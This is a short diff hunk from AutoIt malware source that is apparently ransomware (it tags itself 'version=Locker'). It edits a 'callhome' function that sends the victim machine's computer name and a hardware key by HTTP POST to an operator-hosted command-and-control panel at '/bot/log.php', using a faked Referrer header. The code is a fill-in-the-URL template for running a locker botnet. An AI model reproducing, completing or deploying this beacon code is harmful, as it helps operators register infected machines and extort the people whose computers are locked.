@@ -707,7 +707,7 @@ Func callhome()
 	$data = "pcname=" & @ComputerName & "&hwid=" & $key & "&version=Locker"
 	$oMyError = ObjEvent("AutoIt.Error", "MyErrFunc")
 	$oHTTP = ObjCreate("winhttp.winhttprequest.5.1")
-	$oHTTP.Open("POST", "<url you hosted the C&C on", False) ;ex: http://127.0.0.1/panel/bot/log.php
+	$oHTTP.Open("POST", "<url you hosted the C&C on>/bot/log.php", False) ;ex: http://127.0.0.1/panel/bot/log.php
 	$oHTTP.SetRequestHeader("User-Agent", "agent")
 	$oHTTP.SetRequestHeader("Referrer", "http://www.yahoo.com")
 	$oHTTP.SetRequestHeader("Content-Type", "application/x-www-form-urlencoded")
